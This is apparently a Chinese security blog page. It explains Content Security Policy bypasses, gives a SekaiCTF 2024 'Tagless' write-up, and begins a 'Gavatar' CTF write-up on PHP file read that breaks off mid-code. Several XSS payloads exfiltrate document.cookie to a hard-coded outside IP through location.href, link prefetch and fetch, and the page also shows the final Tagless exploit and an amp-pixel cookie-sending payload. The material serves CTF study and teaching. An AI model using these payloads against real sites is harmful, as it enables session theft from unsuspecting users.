content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;nonce-2726c7f26c9\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \u0026#39;self\u0026#39; data:; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;\u0026#34;\u0026gt; \u0026lt;title\u0026gt;安全留言板\u0026lt;/title\u0026gt; \u0026lt;style nonce=\u0026#34;2726c7f26c9\u0026#34;\u0026gt; body { font-family: \u0026#39;Roboto\u0026#39;, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; } .container { background-color: #f5f5f5; padding: 20px; border-radius: 8px; } #messageInput { width: 70%; padding: 10px; margin-right: 10px; } button { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; } .message-item { background-color: white; padding: 15px; margin: 10px 0; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); } \u0026lt;/style\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Roboto\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;留言板\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;messageForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;messageInput\u0026#34; placeholder=\u0026#34;输入你的留言...\u0026#34; required\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;提交\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;messages\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script nonce=\u0026#34;2726c7f26c9\u0026#34;\u0026gt; document.getElementById(\u0026#39;messageForm\u0026#39;).addEventListener(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); const messageInput = document.getElementById(\u0026#39;messageInput\u0026#39;); const message = messageInput.value.trim(); if (message) { const messageElement = document.createElement(\u0026#39;div\u0026#39;); messageElement.className = \u0026#39;message-item\u0026#39;; messageElement.textContent = message; // 使用textContent而不是innerHTML防止XSS document.getElementById(\u0026#39;messages\u0026#39;).appendChild(messageElement); messageInput.value = \u0026#39;\u0026#39;; } }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 简单解析一下：\ndefault-src 'self'：讲其他没设定的资源设置为同源。 script-src 'self' 'nonce-2726c7f26c9'：允许同源脚本，并且使用了nonce来允许特定内联脚本。 这里有个需要说明一下，看后面的\u0026lt;style\u0026gt;等标签，都是设置了内联token的，这里我们可以通过动态的设置这个token，来达到是否执行这个脚本的问题，在这个前端中，是直接通过\u0026lt;meta\u0026gt;标签来设置的，同样的，动态的话还可以通过HTTP响应头来设置.可以简单改改前面的前端脚本来自己理解一下。\nstyle-src 'self' https://fonts.googleapis.com：允许同源样式和Google Fonts的样式 font-src https://fonts.gstatic.com：允许从Google字体服务器加载字体。 img-src 'self' data:：允许同源图片和data URL图片 object-src 'none'：禁用所有插件内容 form-action 'self'：限制表单只能提交到同源地址 注意：如果设置了多个条件，只需要满足其中一个条件就会允许匹配，两个条件是独立的。\n这里的js代码也是比较也有点意思，是将留言的内容写入到DOM树的，通过Javascript来动态加载的，直接看ctrl+u是看不到的，可以去搭个前端了解一下。\n看了上面的代码，会对CSP的限制会更加清楚，如下说明一下绕过方法。\n绕过手段 这里就说说一下比较有意思的点。\n可以动态执行任意js脚本 当然是存在CSP限制啦，只不过设置的csp为script-src 'unsafe-inline'，也就是允许\u0026lt;script\u0026gt;标签的执行。\n这个绕过方法个人感觉其实不常见，都能随便执行js脚本了。\nlocation.href CSP不影响location.href跳转，直接如下打即可：\n1 2 3 \u0026lt;script\u0026gt; location.href = \u0026#34;http://47.100.223.173:2333?\u0026#34;+document.cookie ;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; location.href = \u0026#34;http://47.100.223.173:2333?\u0026#34;+escape(document.cookie);\u0026lt;/script\u0026gt; link标签的利用 老版本的浏览器可用，当时没有被\u0026lt;meta\u0026gt;标签约束，算是漏掉的，已经被修复了。\n硬写如下：\n1 \u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;//47.100.223.173:2333?${cookie}\u0026#34;\u0026gt; 辩证看待吧，带不出cookie，可能是cookie获取的错误。反正能访问到ip。\n通过js代码如下实现:\n1 2 3 4 \u0026lt;script\u0026gt;var link = document.createElement(\u0026#34;link\u0026#34;); link.setAttribute(\u0026#34;rel\u0026#34;, \u0026#34;prefetch\u0026#34;); link.setAttribute(\u0026#34;href\u0026#34;, \u0026#34;//47.100.223.173:2333/?\u0026#34; + document.cookie); document.head.appendChild(link);\u0026lt;/script\u0026gt; 这样的js代码代码是成功带出来cookie的。\n但是限制都比较大，需要可以执行任意JS脚本。\n其他绕过方法 使用iframe标签绕过 所有的主流浏览器都支持\u0026lt;iframe\u0026gt;标签，这个标签的定义就是规定了一个内联框架，也就是它能够将另一个HTML页面嵌入到当前页面中。\n也就是说，可以怎么办，如果我们能够控制当前的web服务中的一个页面的内容，而另外一个页面是有我想要的东西的，此时我们就可以尝试在能控制得页面中使用iframe标签来嵌入另一个页面，然后将其打印处理啊，这样就能成功绕过CSP的同源限制得到想要得东西了\n一个简单的示例：\n以原先的留言板的代码为例：\napp.html：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;nonce-2726c7f26c9\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \u0026#39;self\u0026#39; data:; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;h1 id=\u0026#34;flag\u0026#34;\u0026gt;flag{text123}\u0026lt;/h1\u0026gt; index.html（可控页面）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var iframe = document.createElement(\u0026#34;iframe\u0026#34;); iframe.setAttribute(\u0026#34;src\u0026#34;, \u0026#34;index.html\u0026#34;); iframe.style.display = \u0026#34;none\u0026#34;; // 隐藏 iframe document.body.appendChild(iframe); iframe.onload = function() { setTimeout(function() { var flagElement = iframe.contentWindow.document.getElementById(\u0026#34;flag\u0026#34;); if (flagElement) { console.log(flagElement.textContent); // 输出 flag 内容 } else { console.log(\u0026#34;Flag not found\u0026#34;); } }, 1000); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; 最后尝试如下，成功在控制台输出：\n当然也可以弹窗输出。这里加的setTimeout()函数，是为了让index.html文档加载完。需要注意的是，这里必须要在script标签外面套一个body标签，这样才能成功加载，可能的原因如下：\n是因为HTML文档的解析是从上到下执行的，当解析到\u0026lt;script\u0026gt;标签时，会马上执行其中的代码，其实相当于把script放在\u0026lt;body\u0026gt;标签前解析，但是注意我们利用代码中的一步：\n1 document.body 这里其实是调用到了DOM的一个对象，此时并没有完成初始化，必须要将其放在\u0026lt;body\u0026gt;标签中，简单给个代码对比一下：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; alert(document.body); // 输出 \u0026lt;body\u0026gt; 元素 \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; alert(document.body); // 输出 null \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt; 结果如上，简单理解一下就行。\n如果可以的话，可以尝试直接写iframe标签的代码，不用再用js代码来构造：\n1 \u0026lt;iframe src=\u0026#34;index.html\u0026#34; title=\u0026#34;iframe Example\u0026#34; width=\u0026#34;400\u0026#34; height=\u0026#34;300\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 这样就直接获取到了内容：\n需要注意的是：这里的src可以是一个url。\n利用场景：\n两个页面，其中一个页面可控，并且存在XSS漏洞，这样可访问存在CSP的页面的内容。\n这个标签还有很多技巧，比如它的srcdoc属性等。可以看下面的例题分享。\n对于\u0026lt;iframe\u0026gt;标签。还有的比较有意思的点可以看看如下文章：\nhttps://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-sandbox\nCDN绕过 一般前端都会用到许多的前端框架和库，简单来说其实就是有些前端会应用其他CDN上的JS框架，但是如果引用的CDN的框架存在什么自定义的标签或其他定义，可以获取cookie等操作，那么此时我们就可以利用这个CDN来绕过CSP。\n但是这个的绕过就一般需要找历史漏洞，或者是挖一个0day出来，简单记录一下：\n如果用了Jquery-mobile库，且CSP中包含script-src 'unsafe-eval或者script-src 'strict-dynamic'，可以用此exp：\n1 \u0026lt;div data-role=popup id=\u0026#39;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库：\n《Breaking XSS mitigations via Script Gadgets》\n还有RCTF2018的AMP题出现了这个的利用。主要还是因为AMP自己提供的组件：\u0026lt;amp-pixel\u0026gt;。可以获取到cookie并向指定的网址发送请求。\n简单说说自己的理解，题目docker有点问题，就没有拉起来试试怎么打了：\nCSP限制为：\n1 script-src \u0026#39;nonce-88f68fa5b7eb8a01de8b8e63b5fb0a6e\u0026#39; \u0026#39;strict-dynamic\u0026#39;; style-src \u0026#39;unsafe-inline\u0026#39; 可以看到对script进行了限制，然后对style-src进行了限制，但是这里没有对img-src进行限制，然后没有定义default-src，这里个人认为的可能的原因是这个\u0026lt;amp-pixel\u0026gt;组件是由img-src来定义的：\n最后的payload如下：\n1 \u0026lt;amp-pixel src=\u0026#34;https://foo.com/pixel?cid=CLIENT_ID(site-user-id-cookie-fallback-name)\u0026#34;\u0026gt;\u0026lt;/amp-pixel\u0026gt; 其他的说明具体参考如下官方文章说明：\n《Analytics: the basics》\n——————\n可以去看看这道题的wp。\nBase-uri绕过 base-uri的绕过，在RCTF2018 rBlog的非预期解，没找到docker，这里就简单讲讲理解。以及wp中的有意思的点。\n这里提到了一个base-uri，这是一个控制\u0026lt;base\u0026gt;标的CSP指令，对于\u0026lt;base\u0026gt;标签的定义，可以知道的是：\n为页面上的所有的相对链接规定默认URL或默认目标，也就是说会将比如\u0026lt;script\u0026gt;、\u0026lt;a\u0026gt;等标签里指向的相对URL都会指向\u0026lt;base\u0026gt;标签中的相对URL。 必须位于\u0026lt;head\u0026gt;元素内部，一般是靠前的部分。 一个文档只有一个\u0026lt;base\u0026gt;标签（非常重要，如果不能覆盖掉原有的，那么就不能利用了） 简单解释一下\u0026lt;base\u0026gt;标签的使用规则：\n1 2 3 4 \u0026lt;head\u0026gt; \u0026lt;base href=\u0026#34;//vps_ip/\u0026#34;\u0026gt; \u0026lt;script nonce=\u0026#39;test\u0026#39; src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; 如上设置，那么\u0026lt;script\u0026gt;加载js文件时就会去访问 http://vps_ip/app.js。所以如果想要利用的话，需要在自己的vps上创建一个同名文件，放进js代码即可。\n但是本地测试如下发现：\n1 2 3 4 5 6 7 8 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;base href=\u0026#34;//47.100.223.173/\u0026#34;\u0026gt; \u0026lt;script nonce=\u0026#39;test\u0026#39; src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这样在\u0026lt;body\u0026gt;中还是能加载到app.js？辩证看待吧。并且需要注意的是，应该是解析顺序的原因，这里需要要利用的\u0026lt;script\u0026gt;标签是在\u0026lt;base\u0026gt;标签下面。\n对于base-uri，如下解释文章：\n《CSP: base-uri》\n里面提到了一个很有意思的点：\ndefault-src，也就是前面提到的，当我们并没有显式地定义一个指令，那么此时就会直接回落这个default-src定义的内容。这个是非常重要的利用点。\n除了base-uri，还有其他如form-action、frame-ancestors等指令。\n所以这个方法的利用条件：\n能在\u0026lt;head\u0026gt;中插入\u0026lt;base\u0026gt;标签 能执行的\u0026lt;script\u0026gt;标签一定至少满足script-src中的一个条件 没有显式设置base-uri 页面引用存在相对路径的\u0026lt;script\u0026gt;标签 RCTF的CSP限制如下：\n1 Content-Security-Policy: default-src \u0026#39;none\u0026#39;; script-src \u0026#39;nonce-720f7efdee4d8940dc71ef5190d6f266\u0026#39;; frame-src https://www.google.com/recaptcha/; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; fonts.googleapis.com; font-src fonts.gstatic.com; img-src \u0026#39;self\u0026#39; 此时可以用 CSP Evaluator 网站简单检测一下：\n可以打base-uri，具体的原理其实就是前面说的，在标题处插入\u0026lt;base\u0026gt;，然后通过加载js文件来打。\n这道题的wp如下文章比较详细：\nhttps://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup\nCRLF绕过 HCTF2018的一道题，当一个页面存在CRLF漏洞时，并且可控点在CSP上方，那么就可以通过换行，将CSP挤到HTTP返回体中，这样来绕过CSP。\n这里主要的利用手法是，前面说了的，如果是使用\u0026lt;meta\u0026gt;标签，需要在\u0026lt;head\u0026gt;中来定义，并且在\u0026lt;body\u0026gt;中的CSP设置是会被忽略的。\n具体利用就网上搜wp看吧。\n题目地址：https://github.com/Lou00/HCTF2018_Bottle，但是有点老了，docker拉不起来，没搭环境复现。\n————————\n等还有很多绕过方式，这里就不多说了，具体可以看参考文章中的先知社区的文章，还是比较全面的。\n例题分享 Tagless SekaiCTF 2024 的题，题目环境：https://github.com/project-sekai-ctf/sekaictf-2024?tab=readme-ov-file\n——————\n开题如下：\n无标签显示器，尝试往里面插入标签，没有显示。看了一下插入位置，是在\u0026lt;body\u0026gt;中。给docker源代码，直接开审。感觉是一个XSS。\nap.py文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from flask import Flask, render_template, make_response, request from bot import * from urllib.parse import urlparse app = Flask(__name__, static_folder=\u0026#39;static\u0026#39;) @app.after_request def add_security_headers(resp): resp.headers[ \u0026#39;Content-Security-Policy\u0026#39;] = \u0026#34;script-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com https://unpkg.com \u0026#39;unsafe-inline\u0026#39;; font-src https://fonts.gstatic.com;\u0026#34; return resp @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#34;/report\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def report(): bot = Bot() url = request.form.get(\u0026#39;url\u0026#39;) if url: try: parsed_url = urlparse(url) except Exception: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid URL.\u0026#34;}, 400 if parsed_url.scheme not in [\u0026#34;http\u0026#34;, \u0026#34;https\u0026#34;]: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid scheme.\u0026#34;}, 400 if parsed_url.hostname not in [\u0026#34;127.0.0.1\u0026#34;, \u0026#34;localhost\u0026#34;]: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid host.\u0026#34;}, 401 bot.visit(url) bot.close() return {\u0026#34;visited\u0026#34;: url}, 200 else: return {\u0026#34;error\u0026#34;: \u0026#34;URL parameter is missing!\u0026#34;}, 400 @app.errorhandler(404) def page_not_found(error): path = request.path return f\u0026#34;{path} not found\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 可以看到这里有设置csp限制，先拿去CSP评估网站评估一下：\n一个object-src，控制插件的一个指令，但是这里用不了。继续审，在report路由，可以发现是一个让bot来访问的操作。看一下bot.py文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from selenium import webdriver from selenium.webdriver.chrome.options import Options import time class Bot: def __init__(self): chrome_options = Options() chrome_options.add_argument(\u0026#34;--headless\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-gpu\u0026#34;) chrome_options.add_argument(\u0026#34;--no-sandbox\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-dev-shm-usage\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-extensions\u0026#34;) chrome_options.add_argument(\u0026#34;--window-size=1920x1080\u0026#34;) self.driver = webdriver.Chrome(options=chrome_options) def visit(self, url): self.driver.get(\u0026#34;http://127.0.0.1:5000/\u0026#34;) self.driver.add_cookie({ \u0026#34;name\u0026#34;: \u0026#34;flag\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;SEKAI{dummy}\u0026#34;, \u0026#34;httponly\u0026#34;: False }) self.driver.get(url) time.sleep(1) self.driver.refresh() print(f\u0026#34;Visited {url}\u0026#34;) def close(self): self.driver.quit() 可以看到在其中的visit()访问时，是带上了flag的，并且将httponly设置为了false，同时需要注意，这里可以看出来是使用的Google引擎。\n那么基本思路就是获取cookie，现在就是看怎么进行利用。\n看一下前端处理渲染的app.js代码，其中看到了一个过滤函数：\n1 2 3 4 function sanitizeInput(str) { str = str.replace(/\u0026lt;.*\u0026gt;/igm, \u0026#39;\u0026#39;).replace(/\u0026lt;\\.*\u0026gt;/igm, \u0026#39;\u0026#39;).replace(/\u0026lt;.*\u0026gt;.*\u0026lt;\\/.*\u0026gt;/igm, \u0026#39;\u0026#39;); return str; } 贪婪匹配，替换为空，基本上过滤完了，但是看出来都是匹配的整个\u0026lt;\u0026gt;标签，这里可以使用\u0026lt;img\u0026gt;标签来进行引入，让其自动匹配\u0026gt;（注意这里要看懂app.js的渲染才好懂）：\n看此时的前端，可以发现应是浏览器自动补足了缺失的\u0026lt;/body\u0026gt;标签：\n但是暂时利用不了，继续看。注意看app.py文件中的404处理过程：\n1 2 3 4 @app.errorhandler(404) def page_not_found(error): path = request.path return f\u0026#34;{path} not found\u0026#34; 处理404页面时，会直接在将路径打印在页面上？\n确实会，那么在这里就可以插入任意的js标签，比如：\n确实解析了，但是并没有执行js解析。此时看到控制台报错：\n这个是被CSP限制了，这里才注意到源代码中的CSP的设置是全部路由：\n1 2 3 4 5 @app.after_request def add_security_headers(resp): resp.headers[ \u0026#39;Content-Security-Policy\u0026#39;] = \u0026#34;script-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com https://unpkg.com \u0026#39;unsafe-inline\u0026#39;; font-src https://fonts.gstatic.com;\u0026#34; return resp 前面忘了，以为是只有index才能。\n所以需要绕一下这个csp，看了一下别人的wp，这里的绕过方法非常精妙呀，这里利用的是\u0026lt;script\u0026gt;标签的src属性，当我们指定src后，引入js文件时就会拼接上路径然后访问，比如\n1 \u0026lt;script src=\u0026#34;/1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 那么引入的文件时发送的请求是http://hostname/1.js，参考文章：https://blog.csdn.net/festone000/article/details/112030241 。\n那么在这里，我们就额可以尝试来构造一下404页面，从而来绕过，但是需要注意的是，有脏数据，比如我们指定访问/alert(1)文件，那么此时的“文件”内容为：\n想要这里的代码正确，需要绕一下。比如前面的/，我们就可以加一个**/来构造多行注释的效果，然后后面的就使用//来单行注释掉即可，最后成功弹窗：\n哇，原来src引入的js文件，如果是本地文件，那么同样是拼接到url上去访问获取内容的，有意思有意思。\n那么现在就可以尝试获取cookie，无httponly，直接外带：\n1 \u0026lt;script%20src=\u0026#34;/**/fetch(`http://47.100.223.173:2333?cookie=${document.cookie}`)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 本地试了一下，edge、firefox和google都能解析，但是就是打不通只能改payload了：\n1 \u0026lt;script src=\u0026#34;/**/fetch(\u0026#39;http://47.100.223.173:2333/\u0026#39;+document.cookie)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 然后传参：\n这个就打出来了：\n服了，又在这个细节点卡了很久。\ndisplay N1CTF Junior 2025的题，具体看我另一篇文章：\nhttps://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display\n参考wp：\nhttps://hackmd.io/@Whale120/HJ_rpvujC\nhttps://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/\nhttps://www.justus.pw/writeups/sekai-ctf/tagless.html\n知识点参考文章：\nhttps://www.cnblogs.com/kinyoobi/p/15341248.html\nhttps://juejin.cn/post/7426954121309356042#heading-5\nhttps://xz.aliyun.com/news/4716\nhttps://xz.aliyun.com/news/6968\n","date":"2025-02-17T00:52:17+08:00","permalink":"https://fupanc-w1n.github.io/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/","title":"浅谈CSP绕过"},{"content":"WEB Gavatar 题目给了docker附件，是php代码。简单看了一下web应用，就是一个注册+登录操作，然后可以上传头像。然后就是审计代码：\n简单贴几个代码出来：\nregister.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] !== \u0026#39;POST\u0026#39;) { header(\u0026#39;Location: index.php\u0026#39;); exit; } $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; if (empty($username) || empty($password)) { header(\u0026#39;Location: index.php?error=Invalid input\u0026#39;); exit; } if (findUserByUsername($username)) { header(\u0026#39;Location: index.php?error=Username already exists\u0026#39;); exit; } $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; $db = getDb(); $db[\u0026#39;users\u0026#39;][] = $user; saveDb($db); $_SESSION[\u0026#39;user_id\u0026#39;] = $user[\u0026#39;id\u0026#39;]; header(\u0026#39;Location: profile.php\u0026#39;); upload.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; highlight_file(__FILE__); $user = getCurrentUser(); if (!$user) header(\u0026#39;Location: index.php\u0026#39;); $avatarDir = __DIR__ . \u0026#39;/avatars\u0026#39;; if (!is_dir($avatarDir)) mkdir($avatarDir, 0755); $avatarPath = \u0026#34;$avatarDir/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } header(\u0026#39;Location: profile.php\u0026#39;); common.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;?php session_start(); function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } function getDb() { $dbPath = __DIR__ . \u0026#39;/../db/db.json\u0026#39;; if (!file_exists($dbPath)) { file_put_contents($dbPath, json_encode([\u0026#39;users\u0026#39; =\u0026gt; []])); } return json_decode(file_get_contents($dbPath), true) ?: [\u0026#39;users\u0026#39; =\u0026gt; []]; } function saveDb($data) { file_put_contents(__DIR__ . \u0026#39;/../db/db.json\u0026#39;, json_encode($data, JSON_PRETTY_PRINT)); } function findUserByUsername($username) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;username\u0026#39;] === $username) return $user; } return null; } function getCurrentUser() { return isset($_SESSION[\u0026#39;user_id\u0026#39;]) ? findUserById($_SESSION[\u0026#39;user_id\u0026#39;]) : null; } function findUserById($id) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;id\u0026#39;] === $id) return $user; } return null; } avatar.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; $user = isset($_GET[\u0026#39;user\u0026#39;]) ? findUserByUsername($_GET[\u0026#39;user\u0026#39;]) : null; $defaultAvatar = __DIR__ . \u0026#39;/images/default-avatar.png\u0026#39;; if (!$user) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); exit; } $avatarPath = __DIR__ . \u0026#34;/avatars/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!file_exists($avatarPath)) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); } else { header(\u0026#39;Content-Type: \u0026#39; . mime_content_type($avatarPath)); readfile($avatarPath); } 审计代码，简单说说逻辑吧，注册时会随机生成强随机的id，然后将其写入到db.json文件中，并且上传的文件会重命名并移动到avatars目录下。在upload.php中，如下代码：\n1 2 3 4 5 6 7 8 9 10 11 if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } 在这个elseif条件中，可以看到是存在文件读取然后文件写入的操作的，但是如果想要访问，最终的基于点都是需要知道这个id，这里我想了一下，是否能够通过覆盖掉id来进行尝试，两个地方，一个是在json文件中尝试，还有一个是在register.php文件中尝试：\n1 2 3 4 5 $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; 但是在注册后写入json文件时，采用的是json_encode($data, JSON_PRETTY_PRINT)结构，这里是会将特殊符号转义的，所以并不能进行。还有一个就是第二个，经测试，是可以进行覆盖的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } //$username=\u0026#34;\u0026#39;123\u0026#39;,\u0026#39;id\u0026#39; =\u0026gt; \u0026#39;123\u0026#39;,\u0026#34;; $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; \u0026#34;admmm\u0026#34;, \u0026#39;id\u0026#39; =\u0026gt; \u0026#34;1111\u0026#34; ]; echo $user[\u0026#34;id\u0026#34;]; //output：1111 这样是可以进行的。但是，在传参解析时，只会将其设定为一个值。不可能通过一个简单的传参来更改后端的逻辑。\n所以只能找其他的地方。最后在avatar.php文件中发现突破点。就简单说说逻辑吧，具体代码回去看。就是通过传参username的值，从db.json文件中获取到整个user的结构（包括id等），然后再获取到id，拼接到avatar来读取文件，然后调用了readfile()读取这个文件，其实就是上传头像后查看头像的功能。只是改了一下逻辑，不是简单的直接访问路径查看，所以这里时可以拿到文件内容的，尝试如下：\n前端要求必须为网址，直接用file协议读就行，读取文件：\n然后查看头像内容：\n成功读取。\n给了docker文件，可以知道是需要命令执行readflag的。有回显，调用文件处理函数，php版本为:\n直接打CVE-2024-2961，但是需要注意session的问题。记着Session()会自动保存cookie，然后我就在改脚本，一直没改出来，最后改了如下位置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def send(self, path: str) -\u0026gt; Response: 